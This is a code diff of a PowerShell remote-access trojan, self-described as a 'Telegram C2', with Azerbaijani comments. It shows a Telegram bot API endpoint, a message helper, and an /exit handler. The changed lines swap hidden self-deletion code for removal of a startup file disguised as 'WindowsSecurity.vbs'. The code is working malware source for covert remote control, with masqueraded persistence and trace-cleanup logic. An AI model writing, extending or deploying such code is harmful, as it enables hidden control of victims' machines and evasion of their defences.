@@ -5,8 +5,6 @@ $apiUrl = "https://api.telegram.org/bot$token"
 $lastUpdateId = 0
 $currentDir = "C:\"
 
-
-
 # --- Köməkçi: mesaj göndər ---
 function Send-Message($text) {
     if ($text.Length -gt 4000) { $text = $text.Substring(0, 4000) + "... (kəsildi)" }
@@ -154,13 +152,10 @@ Telegram C2 - Emrler:
                     }
 
                     if ($cmd -eq "/exit") {
-                        Remove-Item $shortcutPath -Force -ErrorAction SilentlyContinue
-                        $self = $hiddenScript
-                        if (Test-Path $self) {
-                            $cleanup = "Start-Sleep -Seconds 3; Remove-Item '$self' -Force -ErrorAction SilentlyContinue"
-                            Start-Process powershell -ArgumentList "-W Hidden -NoP -Command `"$cleanup`"" -WindowStyle Hidden
-                        }
-                        Send-Message "C2 dayandirilir, startup ve skript fayli silinir"
+                        $startupFolder = [Environment]::GetFolderPath('Startup')
+                        $vbsPath = Join-Path $startupFolder "WindowsSecurity.vbs"
+                        Remove-Item $vbsPath -Force -ErrorAction SilentlyContinue
+                        Send-Message "C2 dayandirilir, VBS startup-dan silindi"
                         exit
                     }
 
